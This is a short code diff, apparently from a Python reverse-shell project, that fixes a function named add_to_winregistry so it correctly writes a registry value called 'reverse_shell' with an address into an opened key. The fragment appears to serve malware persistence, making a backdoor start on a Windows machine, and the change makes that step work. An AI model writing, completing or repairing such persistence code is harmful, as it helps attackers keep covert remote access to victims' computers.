@@ -41,7 +41,7 @@ def add_to_winregistry():
     open = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
 
     # modifiy the opened key
-    winreg.SetValueEx(open, "reverse_shell", 0, winreg.winreg_SZ, address)
+    winreg.SetValueEx(open, "reverse_shell", 0, winreg.REG_SZ, address)
 
     # now close the opened key
     winreg.CloseKey(open)
